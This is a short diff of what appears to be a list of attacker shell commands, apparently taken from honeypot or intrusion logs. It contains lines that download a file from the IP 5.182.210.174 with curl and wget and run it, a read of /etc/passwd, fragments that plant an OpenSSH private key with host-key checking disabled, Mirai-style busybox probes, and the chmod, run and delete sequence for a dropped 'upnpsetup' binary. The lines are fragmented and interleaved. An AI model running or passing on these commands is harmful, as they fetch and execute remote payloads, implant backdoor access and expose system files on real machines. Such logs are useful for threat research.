@@ -21,7 +21,6 @@ curl -O http://5.182.210.174/ok
 rm -rf ok ok.1
 sh ok
 wget http://5.182.210.174/ok
-echo xsec
 -----END OPENSSH PRIVATE KEY-----' > key.ppk; echo 'StrictHostKeyChecking no
 0QAAAAtzc2gtZWQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg
 AAAEAr1wl+3JHkjA3ZtPtjd8bAtLVFo13eZ12Aw2QnFXC/ie94S34m0hVkYFUhtWQe92S9
@@ -32,6 +31,7 @@ bash
 cat /etc/passwd
 cd /tmp || cd /var/tmp || cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----
 echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"
+echo xsec
 id
 &k`g&k|zpkfq)ES[M
 g & k | zpkfq
@@ -57,10 +57,10 @@ za
 zalee
 echo SHELL_TEST
 uname -s -m
+Accept-Encoding: gzip
 ./upnpsetup
 >/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x56\x45\x4d\x43\x48\x4f'
 >/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x59\x49\x48\x4a\x59\x43'
-Accept-Encoding: gzip
 chmod 777 ./upnpsetup
 hostname
 rm ./upnpsetup
